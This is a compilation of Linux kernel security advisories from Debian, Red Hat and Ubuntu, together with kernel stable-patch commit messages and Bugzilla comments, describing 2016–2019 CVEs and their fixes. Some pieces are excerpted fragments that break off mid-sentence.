Debian Bug     : 925919

The linux update issued as DLA-1731-1 caused a regression in the
vmxnet3 (VMware virtual network adapter) driver.  This update corrects
that regression, and an earlier regression in the CIFS network
filesystem implementation introduced in DLA-1422-1.  For reference the
original advisory text follows.

Several vulnerabilities have been discovered in the Linux kernel that
may lead to a privilege escalation, denial of service or information
leaks.

CVE-2016-10741

    A race condition was discovered in XFS that would result in a
    crash (BUG). A local user permitted to write to an XFS volume
    could use this for denial of service.

CVE-2017-5753

    Further instances of code that was vulnerable to Spectre variant 1
    (bounds-check bypass) have been mitigated.

CVE-2017-13305

    A memory over-read was discovered in the keys subsystem's
    encrypted key type. A local user could use this for denial of
    service or possibly to read sensitive information.

CVE-2018-3639 (SSB)

    Multiple researchers have discovered that Speculative Store Bypass
    (SSB), a feature implemented in many processors, could be used to
    read sensitive information from another context. In particular,
    code in a software sandbox may be able to read sensitive
    information from outside the sandbox. This issue is also known as
    Spectre variant 4.

    This update fixes bugs in the mitigations for SSB for AMD
    processors.

CVE-2018-5848

    The wil6210 wifi driver did not properly validate lengths in scan
    and connection requests, leading to a possible buffer overflow.
    On systems using this driver, a local user with the CAP_NET_ADMIN
    capability could use this for denial of service (memory corruption
    or crash) or potentially for privilege escalation.

CVE-2018-5953

    The swiotlb subsystem printed kernel memory addresses to the
    system log, which could help a local attacker to exploit other
    vulnerabilities.

CVE-2018-12896, CVE-2018-13053

    Team OWL337 reported possible integer overflows in the POSIX
    timer implementation. These might have some security impact.

CVE-2018-16862

    Vasily Averin and Pavel Tikhomirov from Virtuozzo Kernel Team
    discovered that the cleancache memory management feature did not
    invalidate cached data for deleted files. On Xen guests using the
    tmem driver, local users could potentially read data from other
    users' deleted files if they were able to create new files on the
    same volume.

CVE-2018-16884

    A flaw was found in the NFS 4.1 client implementation. Mounting
    NFS shares in multiple network namespaces at the same time could
    lead to a user-after-free. Local users might be able to use this
    for denial of service (memory corruption or crash) or possibly
    for privilege escalation.

    This can be mitigated by disabling unprivileged users from
    creating user namespaces, which is the default in Debian.

CVE-2018-17972

    Jann Horn reported that the /proc/*/stack files in procfs leaked
    sensitive data from the kernel. These files are now only readable
    by users with the CAP_SYS_ADMIN capability (usually only root)

CVE-2018-18281

    Jann Horn reported a race condition in the virtual memory manager
    that can result in a process briefly having access to memory after
    it is freed and reallocated. A local user permitted to create
    containers could possibly exploit this for denial of service
    (memory corruption) or for privilege escalation.

CVE-2018-18690

    Kanda Motohiro reported that XFS did not correctly handle some
    xattr (extended attribute) writes that require changing the disk
    format of the xattr. A user with access to an XFS volume could use
    this for denial of service.

CVE-2018-18710

    It was discovered that the cdrom driver does not correctly
    validate the parameter to the CDROM_SELECT_DISC ioctl. A user with
    access to a cdrom device could use this to read sensitive
    information from the kernel or to cause a denial of service
    (crash).

CVE-2018-19824

    Hui Peng and Mathias Payer discovered a use-after-free bug in the
    USB audio driver. A physically present attacker able to attach a
    specially designed USB device could use this for privilege
    escalation.

CVE-2018-19985

    Hui Peng and Mathias Payer discovered a missing bounds check in the
    hso USB serial driver. A physically present user able to attach a
    specially designed USB device could use this to read sensitive
    information from the kernel or to cause a denial of service
    (crash).

CVE-2018-20169

    Hui Peng and Mathias Payer discovered missing bounds checks in the
    USB core. A physically present attacker able to attach a specially
    designed USB device could use this to cause a denial of service
    (crash) or possibly for privilege escalation.

CVE-2018-20511

    InfoSect reported an information leak in the AppleTalk IP/DDP
    implemntation. A local user with CAP_NET_ADMIN capability could
    use this to read sensitive information from the kernel.

CVE-2019-3701

    Muyu Yu and Marcus Meissner reported that the CAN gateway
    implementation allowed the frame length to be modified, typically
    resulting in out-of-bounds memory-mapped I/O writes.  On a system
    with CAN devices present, a local user with CAP_NET_ADMIN
    capability in the initial net namespace could use this to cause a
    crash (oops) or other hardware-dependent impact.

CVE-2019-3819

    A potential infinite loop was discovered in the HID debugfs
    interface exposed under /sys/kernel/debug/hid. A user with access
    to these files could use this for denial of service.

    This interface is only accessible to root by default, which fully
    mitigates the issue.

CVE-2019-6974

    Jann Horn reported a use-after-free bug in KVM. A local user
    with access to /dev/kvm could use this to cause a denial of
    service (memory corruption or crash) or possibly for privilege
    escalation.

CVE-2019-7221

    Jim Mattson and Felix Wilhelm reported a user-after-free bug in
    KVM's nested VMX implementation. On systems with Intel CPUs, a
    local user with access to /dev/kvm could use this to cause a
    denial of service (memory corruption or crash) or possibly for
    privilege escalation.

    Nested VMX is disabled by default, which fully mitigates the
    issue.

CVE-2019-7222

    Felix Wilhelm reported an information leak in KVM for x86.
    A local user with access to /dev/kvm could use this to read
    sensitive information from the kernel.

CVE-2019-9213

    Jann Horn reported that privileged tasks could cause stack
    segments, including those in other processes, to grow downward to
    address 0. On systems lacking SMAP (x86) or PAN (ARM), this
    exacerbated other vulnerabilities: a null pointer dereference
    could be exploited for privilege escalation rather than only for
    denial of service.

For Debian 8 "Jessie", these problems have been fixed in version
3.16.64-1.

We recommend that you upgrade your linux packages.

# Security Data

Red Hat Product Security is committed to providing tools and security data to help security measurement. A part of this commitment is our active participation in various projects such as the CVE Project, the OASIS CSAF technical committee, or SBOM/VEX forums. We provide the raw data below so customers and researchers can produce their own metrics, for their own unique situations, and hold us accountable. To receive notifications when we fix bugs and add new features, please follow the official [Red Hat Security Data Changelog](https://access.redhat.com/articles/5554431).

The data resources linked on this page as well as their alternative representations available through the [Security Data API](https://access.redhat.com/documentation/en-us/red_hat_security_data_api/1.0/html/red_hat_security_data_api/index) are licensed under the [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/). If you distribute this content or a modified version of it, you must provide attribution to Red Hat, Inc. and provide a link to the original.

**Note:** Security data (CSAF, OVAL, SBOM, and other files) published by Red Hat Product Security was previously served from two locations:

* https://access.redhat.com/security/data/\*
* https://www.redhat.com/security/data/\*

A new domain was recently created the scope of which (for the time being) is to serve this same data:

* https://security.access.redhat.com/data/\*

Effective Sep 3, 2024, a redirect was put in place for all traffic from *www.redhat.com/security/data/\** to be redirected to the new *security.access.redhat.com/data/\** domain. On Sep 30, a similar change was made for *access.redhat.com/security/data/\** to redirect to *security.access.redhat.com/data/*. No change to the actual files or directory layout under the *data/\** path was made. You can start consuming from the new domain today. For example: <https://access.redhat.com/security/data/csaf/v2/vex/2024/cve-2024-0151.json> is now available at <https://security.access.redhat.com/data/csaf/v2/vex/2024/cve-2024-0151.json>; on Sep 30, the former began redirecting to the latter.

### CSAF/VEX Documents

The Common Security Advisory Framework (CSAF) standard enables organizations to share information about security issues using a consistent and common format. We provide Red Hat security advisories in CSAF format using the VEX profile as well as per-CVE VEX documents that contains information on both fixed and unfixed products/components.

* [CSAF GA announcement post](https://www.redhat.com/en/blog/csaf-vex-documents-now-generally-available)
  + [Link to CSAF advisories](https://security.access.redhat.com/data/csaf/v2/advisories/)
* [VEX files for CVEs GA announcement post](https://www.redhat.com/en/blog/red-hat-vex-files-cves-are-now-generally-available%20)
  + [Link to CSAF VEX per-CVE files](https://security.access.redhat.com/data/csaf/v2/vex/)

### OSV Records

[Red Hat / OSV.dev announcement on OpenSSF](https://openssf.org/blog/2024/11/01/red-hats-collaboration-with-the-openssf-and-osv-dev-yields-results-red-hat-security-data-now-available-in-the-osv-format/%20). The CSAF advisory data for RPMs is convertered to OSV records and shared with OSV.dev. It is expected that customers will consume this data from OSV.dev not directly from this URL. This is the location OSV.dev consumes the data from.

* [Link to Red Hat OSV data](https://security.access.redhat.com/data/osv/all.json)

### SBOM Documents

Software Bill of Materials (SBOM) is a complete list of components, their versions, licensing information, provenance, and other metadata for a given product. Red Hat publishes SBOM documents for select products at:

* [Link to SBOM documents](https://security.access.redhat.com/data/sbom/beta/spdx/)

### OVAL Definitions

**Note: OVAL/DS v1 files are no longer available and have been archived; see [OVAL v1 deprecation announcement](https://access.redhat.com/OVAL_v1_deprecation_announcement) for more information.**

OVAL definitions are available for vulnerabilities that were addressed in errata for Red Hat Enterprise Linux and select additional products. To completely evaluate your system you will need to evaluate it against the streams for all products installed on that system.

* [OVAL compatibility FAQ](https://access.redhat.com/articles/221883)
* [OVAL Streams directory](https://security.access.redhat.com/data/oval/v2/)
* [SCAP source data stream files](https://security.access.redhat.com/data/metrics/ds/v2/)

### Vulnerability Metadata

#### Repository to CPE Mapping

Used for matching [OVAL security data to installed RPMs](https://www.redhat.com/en/blog/how-accurately-match-oval-security-data-installed-rpms). Each repository also includes a set of relative URLs from where the content of the repository can be downloaded.

* [repository-to-cpe.json](https://security.access.redhat.com/data/meta/v1/repository-to-cpe.json)

#### RHSA RSS feed

An RSS feed that contains a list of Red Hat security advisories released in the last three days.

* [rhsa.rss](https://security.access.redhat.com/data/meta/v1/rhsa.rss)

#### CPE Dictionary

CPE is a structured naming scheme for information technology systems, software, and packages. For reference, we provide a dictionary mapping the CPE names we use, to Red Hat product descriptions. Some of these CPE names will be for new products that are not in the official CPE dictionary, and should therefore be treated as temporary CPE names:

* [cpe-dictionary.xml](https://security.access.redhat.com/data/meta/v1/cpe-dictionary.xml)

### Security Data Archive

Security data files that have been retired are available in an archive. Each file is marked with a date (YYYYMMDD) when it was last updated:

x86/uaccess: Don't leak the AC flag into \_\_put\_user() value evaluation
commit 2a418cf3f5f1caf911af288e978d61c9844b0695 upstream.
When calling \_\_put\_user(foo(), ptr), the \_\_put\_user() macro would call
foo() in between \_\_uaccess\_begin() and \_\_uaccess\_end(). If that code
were buggy, then those bugs would be run without SMAP protection.
Fortunately, there seem to be few instances of the problem in the
kernel. Nevertheless, \_\_put\_user() should be fixed to avoid doing this.
Therefore, evaluate \_\_put\_user()'s argument before setting AC.
This issue was noticed when an objtool hack by Peter Zijlstra complained
about genregs\_get() and I compared the assembly output to the C source.

security\_mmap\_addr() does a capability check with current\_cred(), but

current\_cred() must not be used.
This can be abused on systems without SMAP to make NULL pointer

mmc: spi: Fix card detection during probe
commit c9bd505dbd9d3dc80c496f88eafe70affdcf1ba6 upstream.
When using the mmc\_spi driver with a card-detect pin, I noticed that the
card was not detected immediately after probe, but only after it was
unplugged and plugged back in (and the CD IRQ fired).
The call tree looks something like this:
mmc\_spi\_probe
mmc\_add\_host
mmc\_start\_host
\_mmc\_detect\_change
mmc\_schedule\_delayed\_work(&host->detect, 0)
mmc\_rescan
host->bus\_ops->detect(host)
mmc\_detect
\_mmc\_detect\_card\_removed
host->ops->get\_cd(host)
mmc\_gpio\_get\_cd -> -ENOSYS (ctx->cd\_gpio not set)
mmc\_gpiod\_request\_cd
ctx->cd\_gpio = desc
To fix this issue, call mmc\_detect\_change after the card-detect GPIO/IRQ
is registered.

powerpc: Always initialize input array when calling epapr\_hypercall()
commit 186b8f1587c79c2fa04bfa392fdf084443e398c1 upstream.
Several callers to epapr\_hypercall() pass an uninitialized stack
allocated array for the input arguments, presumably because they
have no input arguments. However this can produce errors like
this one

KVM: nSVM: clear events pending from svm\_complete\_interrupts() when exiting to L1
[ Upstream commit 619ad846fc3452adaf71ca246c5aa711e2055398 ]
kvm-unit-tests' eventinj "NMI failing on IDT" test results in NMI being
delivered to the host (L1) when it's running nested. The problem seems to
be: svm\_complete\_interrupts() raises 'nmi\_injected' flag but later we
decide to reflect EXIT\_NPF to L1. The flag remains pending and we do NMI
injection upon entry so it got delivered to L1 instead of L2.
It seems that VMX code solves the same issue in prepare\_vmcs12(), this was
introduced with code refactoring in commit 5f3d5799974b ("KVM: nVMX: Rework

mac80211: Add attribute aligned(2) to struct 'action'
[ Upstream commit 7c53eb5d87bc21464da4268c3c0c47457b6d9c9b ]
During refactor in commit 9e478066eae4 ("mac80211: fix MU-MIMO
follow-MAC mode") a new struct 'action' was declared with packed
attribute as:
struct {
struct ieee80211\_hdr\_3addr hdr;
u8 category;
u8 action\_code;
} \_\_packed action;
But since struct 'ieee80211\_hdr\_3addr' is declared with an aligned
keyword as:
struct ieee80211\_hdr {
\_\_le16 frame\_control;
\_\_le16 duration\_id;
u8 addr1[ETH\_ALEN];
u8 addr2[ETH\_ALEN];
u8 addr3[ETH\_ALEN];
\_\_le16 seq\_ctrl;
u8 addr4[ETH\_ALEN];
} \_\_packed \_\_aligned(2);
Solve the ambiguity of placing aligned structure in a packed one by
adding the aligned(2) attribute to struct 'action'.
This removes the following warning (W=1):
net/mac80211/rx.c:234:2: warning: alignment 1 of 'struct ' is less than 2 [-Wpacked-not-aligned]

direct-io: allow direct writes to empty inodes
[ Upstream commit 8b9433eb4de3c26a9226c981c283f9f4896ae030 ]
On a DIO\_SKIP\_HOLES filesystem, the ->get\_block() method is currently
not allowed to create blocks for an empty inode. This confusion comes
from trying to bit shift a negative number, so check the size of the
inode first.
The problem is most visible for hfsplus, because the fallback to
buffered I/O doesn't happen and the write fails with EIO. This is in
part the fault of the module, because it gives a wrong return value on
->get\_block(); that will be fixed in a separate patch.

mac80211: fix miscounting of ttl-dropped frames
[ Upstream commit a0dc02039a2ee54fb4ae400e0b755ed30e73e58c ]
In ieee80211\_rx\_h\_mesh\_fwding, we increment the 'dropped\_frames\_ttl'
counter when we decrement the ttl to zero. For unicast frames
destined for other hosts, we stop processing the frame at that point.
For multicast frames, we do not rebroadcast it in this case, but we
do pass the frame up the stack to process it on this STA. That
doesn't match the usual definition of "dropped," so don't count
those as such.
With this change, something like `ping6 -i0.2 ff02::1%mesh0` from a
peer in a ttl=1 network no longer increments the counter rapidly.

drivers: thermal: int340x\_thermal: Fix sysfs race condition
[ Upstream commit 129699bb8c7572106b5bbb2407c2daee4727ccad ]
Changes since V1:
\* Use dev\_info instead of printk
\* Use dev\_warn instead of BUG\_ON
Previously, sysfs\_create\_group was called before all initialization had
fully run - specifically, before pci\_set\_drvdata was called. Since the
sysctl group is visible to userspace as soon as sysfs\_create\_group
returns, a small window of time existed during which a process could read
from an uninitialized/partially-initialized device.
This commit moves the creation of the sysctl group to after all
initialized is completed. This ensures that it's impossible for
userspace to read from a sysctl file before initialization has fully
completed.
To catch any future regressions, I've added a check to ensure
that proc\_thermal\_emum\_mode is never PROC\_THERMAL\_NONE when a process
tries to read from a sysctl file. Previously, the aforementioned race
condition could result in the 'else' branch
running while PROC\_THERMAL\_NONE was set,
leading to a null pointer deference.

ASoC: imx-audmux: change snprintf to scnprintf for possible overflow
[ Upstream commit c407cd008fd039320d147088b52d0fa34ed3ddcb ]
Change snprintf to scnprintf. There are generally two cases where using
snprintf causes problems.
1) Uses of size += snprintf(buf, SIZE - size, fmt, ...)
In this case, if snprintf would have written more characters than what the
buffer size (SIZE) is, then size will end up larger than SIZE. In later
uses of snprintf, SIZE - size will result in a negative number, leading
to problems. Note that size might already be too large by using
size = snprintf before the code reaches a case of size += snprintf.
2) If size is ultimately used as a length parameter for a copy back to user
space, then it will potentially allow for a buffer overflow and information
disclosure when size is greater than SIZE. When the size is used to index
the buffer directly, we can have memory corruption. This also means when
size = snprintf... is used, it may also cause problems since size may become
large. Copying to userspace is mitigated by the HARDENED\_USERCOPY kernel
configuration.
The solution to these issues is to use scnprintf which returns the number of
characters actually written to the buffer, so the size variable will never
exceed SIZE.

ASoC: dapm: change snprintf to scnprintf for possible overflow
[ Upstream commit e581e151e965bf1f2815dd94620b638fec4d0a7e ]
Change snprintf to scnprintf. There are generally two cases where using
snprintf causes problems.
1) Uses of size += snprintf(buf, SIZE - size, fmt, ...)
In this case, if snprintf would have written more characters than what the
buffer size (SIZE) is, then size will end up larger than SIZE. In later
uses of snprintf, SIZE - size will result in a negative number, leading
to problems. Note that size might already be too large by using
size = snprintf before the code reaches a case of size += snprintf.
2) If size is ultimately used as a length parameter for a copy back to user
space, then it will potentially allow for a buffer overflow and information
disclosure when size is greater than SIZE. When the size is used to index
the buffer directly, we can have memory corruption. This also means when
size = snprintf... is used, it may also cause problems since size may become
large. Copying to userspace is mitigated by the HARDENED\_USERCOPY kernel
configuration.
The solution to these issues is to use scnprintf which returns the number of
characters actually written to the buffer, so the size variable will never
exceed SIZE.

usb: gadget: Potential NULL dereference on allocation error
[ Upstream commit df28169e1538e4a8bcd8b779b043e5aa6524545c ]
The source\_sink\_alloc\_func() function is supposed to return error
pointers on error. The function is called from usb\_get\_function() which
doesn't check for NULL returns so it would result in an Oops.
Of course, in the current kernel, small allocations always succeed so
this doesn't affect runtime.

ALSA: compress: prevent potential divide by zero bugs
[ Upstream commit 678e2b44c8e3fec3afc7202f1996a4500a50be93 ]
The problem is seen in the q6asm\_dai\_compr\_set\_params() function:
ret = q6asm\_map\_memory\_regions(dir, prtd->audio\_client, prtd->phys,
(prtd->pcm\_size / prtd->periods),
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
prtd->periods);
In this code prtd->pcm\_size is the buffer\_size and prtd->periods comes
from params->buffer.fragments. If we allow the number of fragments to
be zero then it results in a divide by zero bug. One possible fix would
be to use prtd->pcm\_count directly instead of using the division to
re-calculate it. But I decided that it doesn't really make sense to
allow zero fragments.

scsi: libsas: Fix rphy phy\_identifier for PHYs with end devices attached
commit ffeafdd2bf0b280d67ec1a47ea6287910d271f3f upstream.
The sysfs phy\_identifier attribute for a sas\_end\_device comes from the rphy
phy\_identifier value.
Currently this is not being set for rphys with an end device attached, so
we see incorrect symlinks from systemd disk/by-path:
root@localhost:~# ls -l /dev/disk/by-path/
total 0
lrwxrwxrwx 1 root root 9 Feb 13 12:26 platform-HISI0162:01-sas-exp0x500e004aaaaaaa1f-phy0-lun-0 -> ../../sdb

Indeed, each sas\_end\_device phy\_identifier value is 0:
root@localhost:/# more sys/class/sas\_device/end\_device-0\:0\:2/phy\_identifier
0
root@localhost:/# more sys/class/sas\_device/end\_device-0\:0\:10/phy\_identifier
0
This patch fixes the discovery code to set the phy\_identifier. With this,
we now get proper symlinks:
root@localhost:~# ls -l /dev/disk/by-path/
total 0

Debian Bug     : 904385 918103 922306

Several vulnerabilities have been discovered in the Linux kernel that
may lead to a privilege escalation, denial of service or information
leaks.

CVE-2018-14625

    A use-after-free bug was found in the vhost driver for the Virtual
    Socket protocol.  If this driver is used to communicate with a
    malicious virtual machine guest, the guest could read sensitive
    information from the host kernel.

CVE-2018-16884

    A flaw was found in the NFS 4.1 client implementation. Mounting
    NFS shares in multiple network namespaces at the same time could
    lead to a user-after-free. Local users might be able to use this
    for denial of service (memory corruption or crash) or possibly
    for privilege escalation.

    This can be mitigated by disabling unprivileged users from
    creating user namespaces, which is the default in Debian.

CVE-2018-19824

    Hui Peng and Mathias Payer discovered a use-after-free bug in the
    USB audio driver. A physically present attacker able to attach a
    specially designed USB device could use this for privilege
    escalation.

CVE-2018-19985

    Hui Peng and Mathias Payer discovered a missing bounds check in the
    hso USB serial driver. A physically present user able to attach a
    specially designed USB device could use this to read sensitive
    information from the kernel or to cause a denial of service
    (crash).

CVE-2018-20169

    Hui Peng and Mathias Payer discovered missing bounds checks in the
    USB core. A physically present attacker able to attach a specially
    designed USB device could use this to cause a denial of service
    (crash) or possibly for privilege escalation.

CVE-2018-1000026

    It was discovered that Linux could forward aggregated network
    packets with a segmentation size too large for the output device.
    In the specific case of Broadcom NetXtremeII 10Gb adapters, this
    would result in a denial of service (firmware crash).  This update
    adds a mitigation to the bnx2x driver for this hardware.

CVE-2019-3459, CVE-2019-3460

    Shlomi Oberman, Yuli Shapiro and Karamba Security Ltd. research
    team discovered missing range checks in the Bluetooth L2CAP
    implementation.  If Bluetooth is enabled, a nearby attacker
    could use these to read sensitive information from the kernel.

CVE-2019-3701

    Muyu Yu and Marcus Meissner reported that the CAN gateway
    implementation allowed the frame length to be modified, typically
    resulting in out-of-bounds memory-mapped I/O writes.  On a system
    with CAN devices present, a local user with CAP_NET_ADMIN
    capability in the initial net namespace could use this to cause a
    crash (oops) or other hardware-dependent impact.

CVE-2019-3819

    A potential infinite loop was discovered in the HID debugfs
    interface exposed under /sys/kernel/debug/hid. A user with access
    to these files could use this for denial of service.

    This interface is only accessible to root by default, which fully
    mitigates the issue.

CVE-2019-6974

    Jann Horn reported a use-after-free bug in KVM. A local user
    with access to /dev/kvm could use this to cause a denial of
    service (memory corruption or crash) or possibly for privilege
    escalation.

CVE-2019-7221

    Jim Mattson and Felix Wilhelm reported a user-after-free bug in
    KVM's nested VMX implementation. On systems with Intel CPUs, a
    local user with access to /dev/kvm could use this to cause a
    denial of service (memory corruption or crash) or possibly for
    privilege escalation.

    Nested VMX is disabled by default, which fully mitigates the
    issue.

CVE-2019-7222

    Felix Wilhelm reported an information leak in KVM for x86.
    A local user with access to /dev/kvm could use this to read
    sensitive information from the kernel.

CVE-2019-8980

    A bug was discovered in the kernel_read_file() function used to
    load firmware files. In certain error conditions it could leak
    memory, which might lead to a denial of service. This is probbaly
    not exploitable in a Debian system.

CVE-2019-9213

    Jann Horn reported that privileged tasks could cause stack
    segments, including those in other processes, to grow downward to
    address 0. On systems lacking SMAP (x86) or PAN (ARM), this
    exacerbated other vulnerabilities: a null pointer dereference
    could be exploited for privilege escalation rather than only for
    denial of service.

For Debian 8 "Jessie", these problems have been fixed in version
4.9.168-1~deb8u1.  This version also includes fixes for Debian bugs
#904385, #918103, and #922306; and other fixes included in upstream
stable updates.

We recommend that you upgrade your linux-4.9 and linux-latest-4.9
packages.  You will need to use "apt-get upgrade --with-new-pkgs"
or "apt upgrade" as the binary package names have changed.

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://wiki.debian.org/LTS>

| [Description](show_bug.cgi?id=1719129#c0)  Sam Fowler    2019-06-11 06:45:29 UTC  ``` An excessive resource consumption issue was found in the way  Linux kernel processes TCP segments. If Maximum Segment Size(MSS) of a TCP  connection was set to its lowest value of 48 bytes, it leaves merely 8 bytes for  the user data. It significantly increases Linux kernel's resource (CPU/Memory/Bandwidth etc.) utilisation leading to a DoS like scenario.  A remote attacker could use this flaw to cause DoS by repeatedly sending network  traffic on a TCP connection with lowest value for TCP MSS.

It leaves lesser resources for the other processes and connections on the system.  This resource crunch lasts as long as the offending TCP connections are alive with incoming network traffic. It does not completely halt the system. Network monitoring system(s) would likely raise alerts/alarms for such incoming network traffic. So an administrator should be able to take due measures to thwart offending TCP  connections and pertaining network traffic to control the impact of the DoS on affected systems.   ```  [Comment

## Synopsis

Important: kernel-rt security and bug fix update

## Type/Severity

Security Advisory: Important

## Red Hat Insights patch analysis

Identify and remediate systems affected by this advisory.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2019%3A1480)

## Topic

An update for kernel-rt is now available for Red Hat Enterprise Linux 8.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

The kernel-rt packages provide the Real Time Linux Kernel, which enables fine-tuning for systems with extremely high determinism requirements.

Security Fix(es):

* An integer overflow flaw was found in the way the Linux kernel's networking subsystem processed TCP Selective Acknowledgment (SACK) segments. While processing SACK segments, the Linux kernel's socket buffer (SKB) data structure becomes fragmented. Each fragment is about TCP maximum segment size (MSS) bytes. To efficiently process SACK blocks, the Linux kernel merges multiple fragmented SKBs into one, potentially overflowing the variable holding the number of segments. A remote attacker could use this flaw to crash the Linux kernel by sending a crafted sequence of SACK segments on a TCP connection with small value of TCP MSS, resulting in a denial of service (DoS). (CVE-2019-11477)
* kernel: lack of check for mmap minimum address in expand\_downwards in mm/mmap.c leads to NULL pointer dereferences exploit on non-SMAP platforms (CVE-2019-9213)
* Kernel: tcp: excessive resource consumption while processing SACK blocks allows remote denial of service (CVE-2019-11478)
* Kernel: tcp: excessive resource consumption for TCP connections with low MSS allows remote denial of service (CVE-2019-11479)

For more details about the security issue(s), including the impact, a CVSS score, acknowledgments, and other related information, refer to the CVE page(s) listed in the References section.

Bug Fix(es):

* kernel-rt: update to the RHEL8.0.z batch#1 source tree (BZ#1704955)

## Solution

For details on how to apply this update, which includes the changes described in this advisory, refer to:

<https://access.redhat.com/articles/11258>

The system must be rebooted for this update to take effect.

## Details

It was discovered that a race condition existed in the f2fs file system

implementation in the Linux kernel. A local attacker could use this to

cause a denial of service. ([CVE-2017-18249](/security/CVE-2017-18249))

Wen Xu discovered that the f2fs file system implementation in the Linux

kernel did not properly validate metadata. An attacker could use this to

construct a malicious f2fs image that, when mounted, could cause a denial

of service (system crash). ([CVE-2018-13097](/security/CVE-2018-13097), [CVE-2018-13099](/security/CVE-2018-13099), [CVE-2018-13100](/security/CVE-2018-13100),

[CVE-2018-14614](/security/CVE-2018-14614), [CVE-2018-14616](/security/CVE-2018-14616))

Wen Xu and Po-Ning Tseng discovered that btrfs file system implementation

in the Linux kernel did not properly validate metadata. An attacker could

use this to construct a malicious btrfs image that, when mounted, could

cause a denial of service (system crash). ([CVE-2018-14610](/security/CVE-2018-14610), [CVE-2018-14611](/security/CVE-2018-14611),

[CVE-2018-14612](/security/CVE-2018-14612), [CVE-2018-14613](/security/CVE-2018-14613))

Vasily Averin and Evgenii Shatokhin discovered that a use-after-free

vulnerability existed in the NFS41+ subsystem when multiple network

namespaces are in use. A local attacker in a container could use this to

cause a denial of service (system crash) or possibly execute arbitrary

code. ([CVE-2018-16884](/security/CVE-2018-16884))

It was discovered that a use-after-free vulnerability existed in the PPP

over L2TP implementation in the Linux kernel. A privileged local attacker

could use this to possibly execute arbitrary code. ([CVE-2018-9517](/security/CVE-2018-9517))

Shlomi Oberman, Yuli Shapiro, and Ran Menscher discovered an information

leak in the Bluetooth implementation of the Linux kernel. An attacker

within Bluetooth range could use this to expose sensitive information

(kernel memory). ([CVE-2019-3459](/security/CVE-2019-3459), [CVE-2019-3460](/security/CVE-2019-3460))

Jann Horn discovered that the KVM implementation in the Linux kernel

contained a use-after-free vulnerability. An attacker in a guest VM with

access to /dev/kvm could use this to cause a denial of service (guest VM

crash). ([CVE-2019-6974](/security/CVE-2019-6974))

Jim Mattson and Felix Wilhelm discovered a use-after-free vulnerability in

the KVM subsystem of the Linux kernel, when using nested virtual machines.

A local attacker in a guest VM could use this to cause a denial of service

(system crash) or possibly execute arbitrary code in the host system.

([CVE-2019-7221](/security/CVE-2019-7221))

Felix Wilhelm discovered that an information leak vulnerability existed in

the KVM subsystem of the Linux kernel, when nested virtualization is used.

A local attacker could use this to expose sensitive information (host

system memory to a guest VM). ([CVE-2019-7222](/security/CVE-2019-7222))

Jann Horn discovered that the mmap implementation in the Linux kernel did

not properly check for the mmap minimum address in some situations. A local

attacker could use this to assist exploiting a kernel NULL pointer

dereference vulnerability. ([CVE-2019-9213](/security/CVE-2019-9213))

Muyu Yu discovered that the CAN implementation in the Linux kernel in some

situations did not properly restrict the field size when processing

outgoing frames. A local attacker with CAP\_NET\_ADMIN privileges could use

this to execute arbitrary code. ([CVE-2019-3701](/security/CVE-2019-3701))

Vladis Dronov discovered that the debug interface for the Linux kernel's

HID subsystem did not properly validate passed parameters in some

situations. A local privileged attacker could use this to cause a denial of

service (infinite loop). ([CVE-2019-3819](/security/CVE-2019-3819))

After a standard system update you need to reboot your computer to make

all the necessary changes.

ATTENTION: Due to an unavoidable ABI change the kernel updates have

been given a new version number, which requires you to recompile and

reinstall all third party kernel modules you might have installed.

Unless you manually uninstalled the standard kernel metapackages

(e.g. linux-generic, linux-generic-lts-RELEASE, linux-virtual,

linux-powerpc), a standard system upgrade will automatically perform

this as well.

mm: enforce min addr even if capable() in expand\_downwards()security\_mmap\_addr() does a capability check with current\_cred(), but
we can reach this code from contexts like a VFS write handler where
current\_cred() must not be used.
This can be abused on systems without SMAP to make NULL pointer
dereferences exploitable again.

| [Description](show_bug.cgi?id=1686136#c0)  msiddiqu    2019-03-06 19:50:54 UTC  ``` In the Linux kernel before 4.20.14, expand_downwards in mm/mmap.c lacks a check for the mmap minimum address, which makes it easier for attackers to exploit kernel NULL pointer dereferences on non-SMAP platforms. This is related to a capability check for the wrong task.  An upstream patch:  <https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=0a1d52994d440e21def1c2174932410b4f2a98a1>  References:  <https://bugs.chromium.org/p/project-zero/issues/detail?id=1792>  <https://seclists.org/oss-sec/2019/q1/166>   ```  [Comment 1](show_bug.cgi?id=1686136#c1)  msiddiqu    2019-03-06 19:51:11 UTC  ``` Created kernel tracking bugs for this issue:  Affects: fedora-all [[bug 1686137](show_bug.cgi?id=1686137 "CLOSED ERRATA - CVE-2019-9213 kernel: lack of check for mmap minimum address in expand_downwards in mm/mmap.c leads to NULL pointer dereferences exploit on non-SMAP platforms [fedora-all]")]   ```  [Comment 6](show_bug.cgi?id=1686136#c6)  Wade Mealing    2019-03-12 03:49:15 UTC  ``` Bit of a public update since people have been asking:  The reproducer (and the theory) fails on both Red Hat Enterprise Linux 6 and 7.  The commit which introduced this flaw is 32e4e6d5cbb0c0e427391635991fe65e17797af8 and it needs to be be present to be exploited correctly.   At this time this commit does not exit in Red Hat Enterprise Linux 6 and 7.    This commit however IS present in the kernel-alt (ARM kernel) for rhel-7 based on 4.10.  However for the exploit to work correctly selinux must be disabled.  Other security mitigation technology will assist in mitigating this flaw from being useful (such as PXN (SMEP like) and PAN (SMAP like)), but are not considered an "absolute" defense, attackers may be able to work around these protection mechanisms.   ```  [Comment 8](show_bug.cgi?id=1686136#c8)  Wade Mealing    2019-03-12 06:04:50 UTC  ``` Mitigation:  Enabling selinux prevents the public exploit from working correctly.   ```  [Comment 14](show_bug.cgi?id=1686136#c14)  errata-xmlrpc    2019-04-23 14:30:32 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux 7  Via RHSA-2019:0831 [https://access.redhat.com/errata/RHSA-2019:0831](https://access.redhat.com/errata/RHSA-2019%3A0831)   ```  [Comment 16](show_bug.cgi?id=1686136#c16)  errata-xmlrpc    2019-06-17 18:00:01 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux 8  Via RHSA-2019:1479 